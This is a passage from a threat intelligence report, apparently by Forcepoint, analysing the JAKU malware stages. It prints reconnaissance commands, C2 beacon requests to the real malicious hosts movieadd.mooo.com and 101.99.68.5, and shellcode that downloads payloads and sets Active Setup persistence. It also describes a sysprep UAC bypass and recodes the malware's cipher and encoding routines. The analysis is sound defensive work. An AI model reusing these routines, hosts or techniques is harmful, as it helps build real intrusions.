two other registry values under**\nthe CLSID key. The first one, \"System\", holds the sample's version number; and the second one,\n\"WindowsUpdate\", contains the current system time.\n\n**Reconnaissance. The sample executes the following commands in order:**\n```\n date /t\n time /t\n systeminfo\n tasklist\n dir\"c:\\Program Files\\\"\n dir\"c:\\Program Files (x86)\\\"\n netstat -na\n arp -a\n dir \"%s\"\n dir \"%s\"\n\n```\nWhere \"%s\" is the directory of both the directory of the user's bookmarks (favourites) and then the directory of\nthe recently opened documents.\n\n**TLP-WHITE** |  21\n\n|Name|Services.exe|\n|---|---|\n|Origin|Dropped by SoundFix.exe (from poisoned movie and TV torrents)|\n|C2 Server|SOUNDFIX|\n|Version|11|\n\n\n-----\n\n**Calling Home. The sample then beacons to its C2 server, including sending the version number, private IP**\naddress, GUID and also the encoded system information if the previous registry entries did not already exist. If\nthe registry entries existed already, then only the sample's version number, the GUID and the private IP\naddress are sent. An example of this communication including the system information (&if=) can be seen\nbelow:\n```\n POST http://movieadd.mooo.com/index.php HTTP/1.1\n Content-Type: application/x-www-form-urlencoded\n Accept: */*\n User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0\n Host: movieadd.mooo.com\n Content-Length: 15442\n Connection: Keep-Alive\n Pragma: no-cache\n uid={22CFF683-D866-48AE-9792-073002A23557}&v=11&pi=16843009,&if=\n upOt@M0b5yPI#9vkUpgm2YAgUMLe5dLa@dOoUduaUMPlzCbk@Cv3UcAB#9En@9za@x5ezsA0@cAgUMLa5pBt5YAnUlAn#xRHz\n yvwzyPmzCBcUMPnzy5w4dJkUd4aTxfaLMA3#p3bUYA0Ue@34Mvk@pBnTxOt4lAnTCPtzCPJ#x3Izyvj@sAn@xBJzCBnFcAI#x\n 0m29EQ@xEk#xRkUe@34Mvk@pBnTxOt4nAdUM0V@9AwTxgn2dEwUsfazBAI@xBm@sAkUdEI5xv3zyvj@sAMUM0Wz80BuLv9sLg\n 8Ko4aUpfa5Cb3zyEo#dk3#MuaUC3t@sXi2sW=\n\n```\nThe system information is encoded with base64 using the custom alphabet:\n```\n XAY78BCyz012DEFSuvsKLPx9#@TU456ZabcVW3dejkGHIJtwQRlmnopMfghiNOqr\n\n```\n**Awaiting Orders. The sample then checks the response to the above request from the server. If the server**\nreturns a payload, then the sample will attempt to decrypt and execute it as an executable, and then finish\n(terminate) execution of itself. The format of these payloads that the sample expects is a fake PNG that\ncontains an encryption key, as documented in the next section. Upon further analysis, the malware has no\ncapability of understanding or executing anything other than this format. If no payload is received, the malware\nwill finish (terminate) execution immediately.\n\n**TLP-WHITE** |  22\n\n\n-----\n\n### MALWARE STAGE 2 – FAKE PNG FILES\n\nNot only is the C2 telemetry data held in a file that purports to be a JPEG image file, but the 1[st] stage malware\nitself attempts to download and decrypt the 2[nd] stage in a file that upon first glance appears to be a graphical\nimage. The downloaded file, when examined look like a PNG image file, the headers even conform to the PNG\nfile format:\n```\n $ file 96982dd123c0669e3bad92d9d462733f\n 96982dd123c0669e3bad92d9d462733f: PNG image data, 997393152 x 167848821, 152-bit\n\n```\nThese 2[nd] stage files were reverse engineered and were found to contain data generated by modified\ncryptographic and compression algorithms. Subsequently, Forcepoint created a command line utility to decrypt\nand decompress these fake PNG files.\n\n**Encryption Algorithm. The encryption algorithm used is a modified RC4 implementation. The file analysed**\nhere was one of the 1[st] stage info stealers (SHA1: 5d2f372ace971267c28916ae4cb732aa105fc3b9). A\nmodified RC4 routine was found at offset: 0x0041903C. Forcepoint re-coded this in C as:\n```\n BOOL rc4(BYTE *buf,int bufsize, BYTE *modkey, int modkeylen)// 0x0041903C\n {\n  int i, x;\n  byte g = 0;\n  byte j = 0;\n  unsigned char xorIndex;\n  unsigned char tmp;\n  char keydata[257];\n  char state[257];\n  if (modkey && modkeylen >= 1)\n  {\n    // Zero out the state and keydata\n    memset(state, 0, sizeof(state));\n    memset(keydata, 0, sizeof(keydata));\n    // Initialize the state array with identity permutation (neutral)\n    for (i = 0; i < 256; i++)\n    {\n      state[i] = i;\n    }\n    x = 0;\n    // This is an addition included in the malware\n    // it is an attempt to randomize the permutations in the state array with a modulation key array\n    // But there is a mistake where it's only ever writing to state[2] instead of the\n    // presumably intended state[i]. However, this still results in the permutations being modified\n    // enough to change the rc4 cipher\n    for (i = 0; i < 256; i++)\n    {\n      x = x % modkeylen;\n      state[2] = modkey[x++];\n    }\n    // The permutations in the state array are now morphed/randomized\n    for (i = 0; i < 256; i++)\n    {\n      // Morph the permutations using the key data (which is set to all zeros in this instance)\n      g = (keydata[i] + state[i] + g);\n      // swap some bytes\n      tmp = state[i];\n      state[i] = state[g];\n      state[g] = tmp;\n    }\n    // process the input data\n\n```\n**TLP-WHITE** |  23\n\n\n-----\n\n```\n    for (i = 0, g = 0, j = 0; i < bufsize; i++)\n    {\n      // Adjust indices\n      g = (g + 1);\n      j = (state[g] + j);\n      // swap some bytes\n      tmp = state[g];\n      state[g] = state[j];\n      state[j] = tmp;\n      // obtain xor index in state array\n      xorIndex = (state[j] + state[g]) & 255;\n      // perform the xor on the current index of the buffer\n      buf[i] ^= state[xorIndex];\n    }\n    return TRUE;\n  }\n  return FALSE;\n }\n\n```\n**Bad Crypto. The only significant difference to a standard rc4 routine here is the addition of the “for loop” that**\nis (presumably) meant to randomize the permutations in state[2] with the values from the modulation key.\nHowever, it seems that the author made a mistake: instead of each permutation, only the 3rd value in the array\nis ever modified. Modifying this one byte is still enough to result in a significantly different cipher. Fortunately,\nwith this knowledge, it is trivial to crack the RC4 cipher without knowing the key. This is because it is possible\nto brute force the 3rd element of the state array, in the knowledge that it can only have 256 possible values.\n\n**Compression Algorithm. The malware uses the LZ Huffman compression algorithm (lzhuf). Using an open**\nsource library such as Mike Smiley's LZH implementation allowed us to successfully extract the 2nd stage\nmalware from the fake PNGs being decrypted.\n\n**TLP-WHITE** |  24\n\n\n-----\n\n### MALWARE STAGE 2 – R2D3\n\nR2D3 is a second stage (fake PNG) malware that employs stealth tactics and AV avoidance. Its primary\npurpose appears to be to await an encrypted third stage component to execute.\n\n**Stealth Injection. This second stage malware injects shellcode into a new explorer.exe process every time it**\nwishes to do something significant, such as network traffic, registry, and file execution operations. This is a\nstealth tactic to bypass firewalls and AV by creating a new explorer.exe process and injecting shellcode into\nthe entry point and then terminating the explorer.exe process in the shellcode immediately afterwards.\n\n**AV Engine Detection. The malware checks whether Bitdefender is installed by checking for the mutex**\n\"BDAgent-oneinstance-mutex\" via the CreateMutexA API. It then checks if AVG is installed by looking for an\nevent named \"AVG{53036606-6F17-41a9-80DD-AB930D6BA4DD}\" via the CreateEventA API. If either of\nthese exists, the malware will terminate execution.\n\n**Service Installation. So long as AVG and Bitdefender are not detected, the malware will copy itself to**\n%COMMONPROGRAMFILES%\\CompSvc.exe. It also creates the file\n%COMMONPROGRAMFILES%\\SvcStart.exe, which is embedded within the malware. It then injects shellcode\ninto a new explorer.exe in order to execute SvcStart.exe with the following command line:\n```\n SvcStart.exe R2D2 C:\\Documents and Settings\\user\\Local Settings\\Temp\\filename.ext\n\n```\nWhere \"C:\\Documents and Settings\\user\\Local Settings\\Temp\\filename.ext\" is the location of the original\nmalware file.\n\nAnalysis indicates that there are two command line prefixes:\n\n**R2D2: Terminates the currently running malware, deletes it from hard-disk and then executes the newly**\ncopied version in the common program files directory.\n\n**R2D3: Does not require a directory to be given in the command line string and results in SvcStart.exe dropping**\na batch file named exp.bat in the %TEMP% directory, which simply cleans up all of the malware as below:\n```\n :REPEAT\n DEL %1\n IF EXIST %1 GOTO REPEAT\n DEL %2\n\n```\n**TLP-WHITE** |  25\n\n\n-----\n\nThe R2D2 command line is the only one seen used during live analysis, whereas R2D3 appears to be a cleanup function. When the R2D2 command line is used, SvcStart.exe executes the newly created CompSvc.exe,\nwhich will check if it is running from the common program files directory. If this is the case, it will inject\nshellcode into a new explorer.exe in order to install a persistence key via the Microsoft Active Setup registry\nkey location with a custom GUID:\n```\n.data:0044B114 pRegistryShellCode:           ; DATA XREF: sub_41BA5C+5Bo\n.data:0044B114         push  ebp\n.data:0044B115         mov   ebp, esp\n.data:0044B117         sub   esp, 314h\n.data:0044B11D         push  ebx\n.data:0044B11E         xor   ebx, ebx\n.data:0044B120         cmp   [ebp-8], ebx\n.data:0044B123         push  esi\n.data:0044B124         mov   esi, 12345678h\n.data:0044B129         jz   short loc_44B130\n.data:0044B12B         mov   esi, 87654321h\n.data:0044B130\n.data:0044B130 loc_44B130:               ; CODE XREF: .data:0044B129j\n.data:0044B130         push  edi\n.data:0044B131         push  40h\n.data:0044B133         pop   ecx\n.data:0044B134         xor   eax, eax\n.data:0044B136         lea   edi, [ebp-10Bh]\n.data:0044B13C         mov   [ebp-10Ch], bl\n.data:0044B142         rep stosd\n.data:0044B144         stosw\n.data:0044B146         stosb\n.data:0044B147         push  40h\n.data:0044B149         xor   eax, eax\n.data:0044B14B         pop   ecx\n.data:0044B14C         lea   edi, [ebp-20Fh]\n.data:0044B152         mov   [ebp-210h], bl\n.data:0044B158         push  40h\n.data:0044B15A         rep stosd\n.data:0044B15C         stosw\n.data:0044B15E         stosb\n.data:0044B15F         pop   ecx\n.data:0044B160         xor   eax, eax\n.data:0044B162         lea   edi, [ebp-313h]\n.data:0044B168         mov   [ebp-314h], bl\n.data:0044B16E         rep stosd\n.data:0044B170         stosw\n.data:0044B172         push  8003h\n.data:0044B177         mov   [ebp-4], ebx\n.data:0044B17A         stosb\n.data:0044B17B         call  dword ptr [esi+2Ch] ; kernel32.SetErrorMode\n.data:0044B17E         lea   eax, [esi+344h]\n.data:0044B184         push  eax\n.data:0044B185         call  dword ptr [esi+20h] ; GetModuleHandleA(\"ntdll.dll\")\n.data:0044B188         mov   edi, eax\n.data:0044B18A         lea   eax, [esi+354h]\n.data:0044B190         push  eax\n.data:0044B191         push  edi\n.data:0044B192         call  dword ptr [esi+24h] ; GetProcAddress(\"strlen\")\n.data:0044B195         mov   [ebp-8], eax\n.data:0044B198         lea   eax, [esi+374h]\n.data:0044B19E         push  eax\n.data:0044B19F         push  edi\n.data:0044B1A0         call  dword ptr [esi+24h] ; GetProcAddress(\"strcpy\")\n.data:0044B1A3         mov   edi, eax\n.data:0044B1A5         lea   eax, [esi+34h]\n.data:0044B1A8         push  eax\n.data:0044B1A9         lea   eax, [ebp-10Ch]\n.data:0044B1AF         push  eax\n.data:0044B1B0         call  edi       ; ntdll.strcpy\n.data:0044B1B2         lea   eax, [esi+138h]\n.data:0044B1B8         push  eax\n.data:0044B1B9         lea   eax, [ebp-210h]\n.data:0044B1BF         push  eax\n.data:0044B1C0         call  edi       ; ntdll.strcpy\n.data:0044B1C2         lea   eax, [esi+23Ch]\n.data:0044B1C8         push  eax\n.data:0044B1C9         lea   eax, [ebp-314h]\n.data:0044B1CF         push  eax\n.data:0044B1D0         call  edi       ; ntdll.strcpy\n.data:0044B1D2         add   esp, 18h\n.data:0044B1D5         cmp   dword ptr [esi+340h], 1\n.data:0044B1DC         lea   eax, [ebp-4]\n.data:0044B1DF         pop   edi\n.data:0044B1E0         push  eax\n\n```\n**TLP-WHITE** |  26\n\n\n-----\n\n```\n.data:0044B1E1         lea   eax, [ebp-10Ch]\n.data:0044B1E7         push  eax\n.data:0044B1E8         push  dword ptr [esi+30h]\n.data:0044B1EB         jnz   short loc_44B235 ; RegOpenKeyA\n.data:0044B1ED         call  dword ptr [esi+4] ; RegOpenKeyA(\"Software\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\{4C2830A1-7D22-4f20ADA2-3901BD61DDE4}\")\n.data:0044B1F0         test  eax, eax\n.data:0044B1F2         jz   short loc_44B20C\n.data:0044B1F4         lea   eax, [ebp-4]\n.data:0044B1F7         push  eax\n.data:0044B1F8         lea   eax, [ebp-10Ch]\n.data:0044B1FE         push  eax\n.data:0044B1FF         push  dword ptr [esi+30h]\n.data:0044B202         call  dword ptr [esi] ; RegCreateKeyA(\"Software\\\\Microsoft\\\\Active Setup\\\\Installed Components\\\\{4C2830A1-7D22-4f20ADA2-3901BD61DDE4}\")\n.data:0044B204         test  eax, eax\n.data:0044B206         jnz   loc_44B291\n.data:0044B20C\n.data:0044B20C loc_44B20C:               ; CODE XREF: .data:0044B1F2j\n.data:0044B20C         lea   eax, [ebp-314h]\n.data:0044B212         push  eax\n.data:0044B213         call  dword ptr [ebp-8] ; ntdll.strlen\n.data:0044B216         pop   ecx\n.data:0044B217         push  eax\n.data:0044B218         lea   eax, [ebp-314h]\n.data:0044B21E         push  eax\n.data:0044B21F         push  1\n.data:0044B221         lea   eax, [ebp-210h]\n.data:0044B227         push  ebx\n.data:0044B228         push  eax\n.data:0044B229         push  dword ptr [ebp-4]\n.data:0044B22C         call  dword ptr [esi+8] ; RegSetValueExA(\"C:\\\\Program Files\\\\Common Files\\\\Services\\\\SvcStart.exe\")\n.data:0044B22F         test  eax, eax\n.data:0044B231         jnz   short loc_44B28B\n.data:0044B233         jmp   short loc_44B283\n.data:0044B235 ; --------------------------------------------------------------------------.data:0044B235\n.data:0044B235 loc_44B235:               ; CODE XREF: .data:0044B1EBj\n.data:0044B235         call  dword ptr [esi+4] ; RegOpenKeyA\n.data:0044B238         test  eax, eax\n.data:0044B23A         jnz   short loc_44B291\n.data:0044B23C         lea   eax, [ebp-210h]\n.data:0044B242         push  eax\n.data:0044B243         call  dword ptr [ebp-8] ; ntdll.strlen\n.data:0044B246         test  eax, eax\n.data:0044B248         pop   ecx\n.data:0044B249         jnz   short loc_44B26C\n.data:0044B24B         push  dword ptr [ebp-4]\n.data:0044B24E         call  dword ptr [esi+14h] ; RegCloseKey\n.data:0044B251         lea   eax, [ebp-10Ch]\n.data:0044B257         push  eax\n.data:0044B258         push  dword ptr [esi+30h]\n.data:0044B25B         call  dword ptr [esi+0Ch] ; RegDeleteKeyA\n.data:0044B25E         test  eax, eax\n.data:0044B260         jnz   short loc_44B291\n.data:0044B262         push  0C8h\n.data:0044B267         call  dword ptr [esi+28h] ; ExitProcess\n.data:0044B26A         jmp   short loc_44B291\n.data:0044B26C ; --------------------------------------------------------------------------.data:0044B26C\n.data:0044B26C loc_44B26C:               ; CODE XREF: .data:0044B249j\n.data:0044B26C         lea   eax, [ebp-210h]\n.data:0044B272         push  eax\n.data:0044B273         push  dword ptr [ebp-4]\n.data:0044B276         call  dword ptr [esi+10h] ; RegDeleteValueA\n.data:0044B279         test  eax, eax\n.data:0044B27B         jnz   short loc_44B28B\n.data:0044B27D         push  dword ptr [ebp-4]\n.data:0044B280         call  dword ptr [esi+14h] ; RegCloseKey\n.data:0044B283\n.data:0044B283 loc_44B283:               ; CODE XREF: .data:0044B233j\n.data:0044B283         push  0C8h\n.data:0044B288         call  dword ptr [esi+28h] ; ExitProcess\n.data:0044B28B\n.data:0044B28B loc_44B28B:               ; CODE XREF: .data:0044B231j\n.data:0044B28B                     ; .data:0044B27Bj\n.data:0044B28B         push  dword ptr [ebp-4]\n.data:0044B28E         call  dword ptr [esi+14h] ; RegCloseKey\n.data:0044B291\n.data:0044B291 loc_44B291:               ; CODE XREF: .data:0044B206j\n.data:0044B291                     ; .data:0044B23Aj ...\n.data:0044B291         push  64h\n.data:0044B293         call  dword ptr [esi+28h] ; ExitProcess\n.data:0044B296         pop   esi\n.data:0044B297         xor   eax, eax\n\n```\n**TLP-WHITE** |  27\n\n\n-----\n\n```\n.data:0044B299         pop   ebx\n.data:0044B29A         leave\n.data:0044B29B         retn\n\n```\n**Winpcap. After the shellcode is injected, the malware will load the winpcap npf.sys driver if it exists. It then**\nbegins to monitor all network adapters in order to determine which interface is the primary adapter that can\naccess the internet. Then, it makes a POST request to the C2 server with gzip compressed system\ninformation:\n```\n POST http://101.99.68.5/bbs/CaC.php HTTP/1.1\n Content-Type: multipart/form-data; boundary=--HC-MPFD-BOUNDARY\n Content-Length: 320\n User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko)\n Chrome/36.0.1985.125 Safari/537.36\n Host: 101.99.68.5\n Proxy-Connection: Keep-Alive\n Pragma: no-cache\n ----HC-MPFD-BOUNDARY\n Content-Disposition: form-data; name=\"id\"\n AAwp2ySc\n ----HC-MPFD-BOUNDARY\n Content-Disposition: form-data; name=\"userfile\"; filename=\"AAwp2ySc.ifo\"\n Content-Type: application/octet-stream\n\n```\n�������\n```\n s�s�u�R��t��w\n\n```\n���s\n�R054644����R�5246��4415��r�����K������?���\n```\n ----HC-MPFD-BOUNDARY-\n```\nThe \"id\" value \"AAwp2ySc\" is a base64 encoded version of the MAC address's hexadecimal values for the\nadapter that is determined to be the primary one, which in this instance was “00 0c 29 db 24 9c”. The gzip\ncompressed data, in plaintext looks like this example:\n```\n CNAME: MICROSOFT\n OSVER: 513112\n IP: -2132891456\n DNAME: None\n\n```\nNext, the malware injects shellcode into explorer.exe to contact its C2 with a GET request, which seems to\nexpect another encrypted malware to be returned. The following shows parts of the shellcode (dumped from\nOllydbg), which shows this C2 server communication. The comments indicate what the values of certain\nregisters and addresses are in real time. Again, the MAC address identifier can be seen in the following\nnetwork traffic shellcode:\n```\n 0101A63E      8D6E 1C           LEA EBP,DWORD PTR DS:[ESI+0x1C]      ; http://101.99.68.5/bbs/CaC.php?id=AAwp2ySc\n ...\n 0101A667      8D86 70050000        LEA EAX,DWORD PTR DS:[ESI+0x570]     ; URLDownloadToFileA\n 0101A66D      50             PUSH EAX\n 0101A66E      53             PUSH EBX                 ; HMODULE = urlmon.dll\n 0101A66F      FF56 08           CALL DWORD PTR DS:[ESI+0x8]        ; kernel32.GetProcAddress\n 0101A672      8BD8            MOV EBX,EAX\n 0101A674      85DB            TEST EBX,EBX\n 0101A676      75 05            JNZ SHORT explorer.0101A67D\n 0101A678      6A 64            PUSH 0x64\n 0101A67A      FF56 0C           CALL DWORD PTR DS:[ESI+0xC]        ; kernel32.ExitProcess\n 0101A67D      8D86 6C040000        LEA EAX,DWORD PTR DS:[ESI+0x46C]     ; C:\\DOCUME~1\\user\\LOCALS~1\\Temp\\tmp2F.tmp\n 0101A683      6A 00            PUSH 0x0\n 0101A685      6A 00            PUSH 0x0\n 0101A687      50             PUSH EAX\n 0101A688      55             PUSH EBP                 ; http://101.99.68.5/bbs/CaC.php?id=AAwp2ySc\n 0101A689      6A 00            PUSH 0x0\n 0101A68B      FFD3            CALL EBX                 ; URLDownloadToFileA\n\n```\n**TLP-WHITE** |  28\n\n\n-----\n\nThe code continues on to delete a Zone.Identifier ADS for msvcrt.dll (msvcrt.dll:Zone.Identifier). The purpose\nof this part of the code is unclear, because msvcrt.dll does not seem to be overwritten by the malware and\nshould not contain a Zone.Identifier record that prevents its usage in any way.\n\n**Malware Configuration. The malware also contains a configuration of sorts. Some of the parts include:**\n```\n S[32]:inner_UniqID=4C2830A17D224f20ADA23901BD61DDE4\n B:inner_Escl=1\n S[260]Exe Location=C:\\Program Files\\Common Files\\Services\\CompSvc.exe\n\n```\nEach field is preceded by the length and type of the value associated with it. For example: S[32] means that\nthe value contains a string of 32 characters.\n\n  - The inner_UniqID value seems to be a static value, probably used as a campaign identifier.\n\n  - The inner_Escl value is a Boolean, indicating whether escalated permissions are available. If not, then\nthe malware drops a DLL payload into the Windows sysprep folder under the name cryptbase.dll. It\nthen launches sysprep.exe, which will run with administrative permissions and load up cryptbase.dll\nfrom the current folder rather than the system folder. This technique is a commonly used means of\nbypassing Windows User Account Control (UAC).\n\n  - The Exe Location value is the current location of the malware.\n\n**TLP-WHITE** |  29\n\n\n-----\n\n### MALWARE STAGE 2 – C3PRO-RACCOON\n\nC3PRO-RACCOON is another one of the second stage components (fake PNG) that is hosted on a C2 server\nwith the small amount of targeted victims. This C2 data set is suspected of being a targeted set of victims and\nis referred to within the JAKU analysis as RACCOON.\n\nThe C3PRO- RACCOON malware initially communicates with a specific C2 server over DNS. Kaspersky have\nalready blogged about this same malware family when it was hosted on the KCNA North Korean news site in\nearly 2015:\n```\nSHA1: c28bdea5e823cbca16d22a318ff29a338fcf0379\n\n```\n**C3PRO-RACCOON Behaviour. This malware sample is another self-extractor, which drops the usual start.bat**\nand end.bat files along with the Trojan component and a utility to add a new Windows task:\n```\nstart.bat\nend.bat\ndrmanidd32.dll (C3PRO-RACCOON trojan)\nSetTaskPathDl.exe (C# utility to add a new Windows task)\nMicrosoft.Win32.TaskScheduler.dll (legitimate file used by SetTaskPathDl.exe for task scheduler stuff)\n\n```\nThe file start.bat is executed which results in SetTaskPathDl.exe being invoked with the following arguments:\n```\n%temp%\\SetTaskPathDl.exe drmanidd32.dll Adobe Update SecuUpdates.dll\n\n```\nThis results in drmanidd32.dll being moved to %appdata%\\Adobe\\Update\\SecuUpdates.dll and a Windows\ntask created to execute the following command upon user logon:\n```\nC:\\WINDOWS\\system32\\rundll32.exe %appdata%\\Adobe\\Update\\SecuUpdates.dll,start now\n\n```\nOnce executed, SecuUpdates.dll generates DNS traffic, which is the C2 channel communication:\n\nThe malware resolves a specific C2 DNS name and uses the returned IP as a DNS server for resolving the\nCNAME of pWrpqMoqqipJiiwGBgaoxueIyMaG56g.e.q, which results in a resolution of LS4.com at IP\n231.157.250.149.\n\nThe pWrpqMoqqipJiiwGBgaoxueIyMaG56g string is a base64 encoded, encrypted version of\n_\"+MICROSOFT_000C29DB249C\" which is a '+' followed by the current computer name, \"_\" and then the MAC_\naddress of the primary network adapter.\n\n**TLP-WHITE** |  30\n\n\n-----\n\nHere is the encryption routine in assembly:\n```\nloop:\n  mov   al, buffer[ecx]  ; buffer contains string to encrypt (i.e. \"+MICROSOFT_000C29DB249C\")\n  add   al, 3       ; Add a value of 3 to the current 8-bit char value\n  movzx  eax, al      ; Clear eax, replace with lower 8-bit val (this is pointless, poor coding)\n  xor   eax, 3       ; XOR 32-bit value of eax (which is just 8-bit al, effectively) by 3\n  mov   edx, eax      ; Save eax in edx\n  shr   edx, 3       ; Shift edx right by 3 bits\n  shl   al, 5       ; Shift 8-bit eax value left by 5 bits\n  or   dl, al       ; OR 8-bit edx against 8-bit eax\n  mov   buffer[ecx], dl  ; Copy new value (stored in dl) into current index of buffer\n  inc   ecx        ; Increase buffer index\n  cmp   ecx, edi      ; Check if we're done yet\n  jl   short loop\n\n```\nThis routine is poorly coded, as 32-bit values are not required. Alternatively, the author introduced an error in\nthe left shift. Regardless, once corrected and optimised, the routine look like this:\n```\nloop:\n  mov   al, buffer[ecx]  ; buffer contains string to encrypt (i.e. \"+MICROSOFT_000C29DB249C\")\n  add   al, 3       ; Add a value of 3 to the current char value\n  xor   al, 3       ; XOR char value by 3\n  mov   dl, al       ; Copy char value (into dl)\n  shr   dl, 3       ; Shift char value right by 3 bits (truncate)\n  shl   al, 5       ; Shift the same char value (in al) left by 5 bits (truncate)\n  or   dl, al       ; OR both char values\n  mov   buffer[ecx], dl  ; Copy new value (stored in dl) into current index of buffer\n  inc   ecx        ; Increase buffer index\n  cmp   ecx, edi      ; Check if we're done yet\n  jl   short loop\n\n```\nOr the same, more complete routine in C:\n```\nvoid encode(char *buffer)\n{\n  for (int i = 0; i < strlen(buffer); i++)\n  {\n    unsigned char a = buffer[i];\n    unsigned char b;\n    a += 3;\n    a ^= 3;\n    b = a;\n    b >>= 3;\n    a <<= 5;\n    b |= a;\n    buffer[i] = b;\n  }\n}\n\n```\n**TLP-WHITE** |  31\n\n\n-----\n\n**DNS Command Channel. The DNS requests containing the encrypted system name and MAC address**\nhappen regularly (~2 minutes), with the IP of LS4.com changing each time. The malware translates LS4.com\ninto LS4=, base64 decodes it and then decrypts it using the reverse of the algorithm above. The result of this\nis the string \"go\", and the malware also understands the following commands:\n\n**COMMAND** **PURPOSE** **NOTES**\n\ngo This just means \"OK - no action to take\" Takes 0 parameters\nti Change wait/sleep time between DNS C2 attempts Takes 1 parameter (sleep time in\nminutes)\nsh Not implemented by author This routine does nothing and appears to\nbe a placeholder for a future routine\nfs Start UDT based C2 module Takes 2 parameters (port, server)\nts Start secondary C2 module Takes 2 parameters (port, server)\ndl Inject a DLL into a process via remote thread in Takes 2 parameters (DLL filename,\nexplorer.exe process name without .exe)\n\ndu Unload DLL from current process via remote thread Takes 2 parameters (first param must be\nin explorer.exe 0, second is DLL filename)\n\nde Securely delete file (write/read 4 times, rename Takes 1 parameter (file to delete)\n900 times, truncate to 0 size, then delete)\n\ncm Execute command-line utility (%COMSPEC%) with Takes 1 parameter (command to\nparameter and send results to C2 over DNS execute)\n\ncu Send computer information to C2 over DNS Takes 2 parameters (port - ignored,\nserver)\nex Execute command via WinExec but do not send Takes 1 parameter (command to\nback the results to C2 server execute)\n\nA \"parameter\" here is a part of the CNAME separated by a \".\". For example, \"LS4.test.com\" would be the\ncommand, \"go\" with 1 parameter \"test\"..\n\nThe \"secondary\" C2 module receives commands over TCP and a custom protocol. The data structures are\ndefined below:\n```\n// This is the client hello packet structure (actually not really a structure, just a 4 byte value)\ntypedef struct clienthello_s\n{\n  uint32 client_magic; // Must be 0xDF1B697A\n} clienthello_t; \n// This is the encryption key structure for packet encryption & decryption\ntypedef struct keyheader_s\n{\n  byte subkey;\n  byte xorkey;\n  byte rolkey;\n  byte _align; // Unused, just here for alignment\n} keyheader_t; \n// This is the full structure for anything received from the server\ntypedef struct servercmd_s\n{\n  uint32   server_magic;  // Must be 0xA37CE092\n  keyheader_t hdr;      // Encryption keys\n\n```\n**TLP-WHITE** |  32\n\n|COMMAND PURPOSE NOTES|Col2|Col3|\n|---|---|---|\n|go|This just means \"OK - no action to take\"|Takes 0 parameters|\n|ti|Change wait/sleep time between DNS C2 attempts|Takes 1 parameter (sleep time in minutes)|\n|sh|Not implemented by author|This routine does nothing and appears to be a placeholder for a future routine|\n|fs|Start UDT based C2 module|Takes 2 parameters (port, server)|\n|ts|Start secondary C2 module|Takes 2 parameters (port, server)|\n|dl|Inject a DLL into a process via remote thread in explorer.exe|Takes 2 parameters (DLL filename, process name without .exe)|\n|du|Unload DLL from current process via remote thread in explorer.exe|Takes 2 parameters (first param must be 0, second is DLL filename)|\n|de|Securely delete file (write/read 4 times, rename 900 times, truncate to 0 size, then delete)|Takes 1 parameter (file to delete)|\n|cm|Execute command-line utility (%COMSPEC%) with parameter and send results to C2 over DNS|Takes 1 parameter (command to execute)|\n|cu|Send computer information to C2 over DNS|Takes 2 parameters (port - ignored, server)|\n|ex|Execute command via WinExec but do not send back the results to C2 server|Takes 1 parameter (command to execute)|\n\n\n-----\n\n```\n  long    cmdlen;     // Length of command buffer (encrypted)\n  char    cmdbuf[512];  // Command buffer (encrypted)\n} servercmd_t;\n// This is used by the file upload & download routines\ntypedef struct filetransfer_s\n{\n  long    filesize;    // Size of file (encrypted)\n  byte    filedata[];   // File contents (encrypted)    \n} filetransfer_t;\n\n```\nThe \"UDT\" C2 module receives commands over UDP and the UDT library protocol. The data structures used\nby the malware are similar to the ones above, but without magic values or encryption keys. Instead, the\nencryption keys are static. The UDT C2 module only supports a subset of the commands that the secondary\nC2 module does.\n\nThe command set supported by the secondary and UDT C2 modules is the same as in Kaspersky’s analysis\nof the KCNA malware. However, our analysis of the KCNA malware and C3PRO-RACCOON revealed some\nadditional functionality and small differences in what Kaspersky reported.\n\nThe full list of commands used by the secondary and UDT modules can be seen in the table below:\n\n**COMMAND** **PURPOSE**\n\n_get Encrypt and send specified file\n\n_got Encrypt and send specified file and then securely delete it from disk\n\n_cmd Execute command-line utility (%COMSPEC%) with parameter and send results to C2\n\n_exe Execute parameter via WinExec API\n\n_quit Exit the C2 thread\n_inf Grab system information, save it to file, encrypt it, send it to C2 and then securely delete it.\n\n           - Operating system version\n\n           - Username\n\n           - Computer name\n\n           - System drive\n\n           - Local time\n\n           - All connected drives and properties\n\n           - Network adapter properties\n\n           - Disk free space\n\n           - All installed programs\n_dll Inject a DLL into a process via remote thread in explorer.exe\n\n_put Receive, decrypt, and write a buffer to disk at a specified file location\n\n_del Securely delete specified file using John Underhill's \"Secure File Shredder\" code\n\n_dir Send a directory listing for path specified\n\n_prc Send a full running process list to C2\n\n_cap Take a screenshot, save it to file, encrypt it, send it to C2 and then securely delete it\n\n_dlu Unload DLL from current process only via remote thread in explorer.exe\n\n**TLP-WHITE** |  33\n\n|COMMAND PURPOSE|Col2|\n|---|---|\n|_get|Encrypt and send specified file|\n|_got|Encrypt and send specified file and then securely delete it from disk|\n|_cmd|Execute command-line utility (%COMSPEC%) with parameter and send results to C2|\n|_exe|Execute parameter via WinExec API|\n|_quit|Exit the C2 thread|\n|_inf|Grab system information, save it to file, encrypt it, send it to C2 and then securely delete it.  Operating system version  Username  Computer name  System drive  Local time  All connected drives and properties  Network adapter properties  Disk free space  All installed programs|\n|_dll|Inject a DLL into a process via remote thread in explorer.exe|\n|_put|Receive, decrypt, and write a buffer to disk at a specified file location|\n|_del|Securely delete specified file using John Underhill's \"Secure File Shredder\" code|\n|_dir|Send a directory listing for path specified|\n|_prc|Send a full running process list to C2|\n|_cap|Take a screenshot, save it to file, encrypt it, send it to C2 and then securely delete it|\n|_dlu|Unload DLL from current process only via remote thread in explorer.exe|\n\n\n-----\n\n### OBSERVATIONS ON C3PRO-RACCOON\n\nThe ability for malware to concurrently support three separate, custom built C2 channels is more advanced\nthan the majority of malware currently observed in the global threat landscape. This offers insight into the\namount of effort the malware author and actor(s) have expended to ensure that the malware is stealthy and\ncan remain in contact with its C2s, despite the network environment it may be running within.\n\n**UDT Library. The malware uses an open source library called UDT[3] for one of its C2 channels. UDT provides**\nmuch of the benefits of TCP but retains higher data transfer speeds over UDP. The authors likely chose the\nlibrary in order to provide the flexibility of being able to securely use UDP for C2 communication, as well as\nbeing stealthy at the same time.\n\n**Secure Delete. The file deletion routine has been taken from publicly available secure erasure code. This**\ncode was originally written by John Underhill and called “Secure File Shredder”[4]. The routine used in the\nmalware even contains the same mistake as John 